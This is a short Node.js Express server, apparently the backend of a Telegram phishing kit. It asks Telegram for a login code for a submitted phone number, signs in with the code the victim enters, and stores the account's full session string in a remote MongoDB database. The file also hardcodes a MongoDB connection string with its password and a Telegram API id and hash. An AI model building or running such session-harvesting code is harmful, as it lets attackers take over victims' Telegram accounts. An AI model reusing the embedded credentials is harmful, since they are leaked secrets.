const express = require('express');
const cors = require('cors');
const { TelegramClient, StringSession } = require('telegram');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Verbindung
const uri = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
mongoose.connect(uri);

const SessionSchema = new mongoose.Schema({ phone: String, session: String });
const Session = mongoose.model('Session', SessionSchema);

// Temporärer Speicher für laufende Logins
const loginSessions = {}; 

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    const client = new TelegramClient(new StringSession(''), 23049703, 'e9c00af578a9de0253ef02337460498f', { connectionRetries: 5 });
    await client.connect();
    
    const result = await client.sendCode({ apiId: 23049703, apiHash: 'e9c00af578a9de0253ef02337460498f' }, phone);
    loginSessions[phone] = { client, phoneCodeHash: result.phoneCodeHash };
    
    res.json({ success: true });
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code } = req.body;
    const sessionData = loginSessions[phone];
    
    try {
        await sessionData.client.signIn({
            apiId: 23049703,
            apiHash: 'e9c00af578a9de0253ef02337460498f',
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: sessionData.phoneCodeHash
        });
        
        const stringSession = sessionData.client.session.save();
        await Session.create({ phone, session: stringSession });
        res.json({ success: true });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.listen(3000, () => console.log('Server läuft.'));
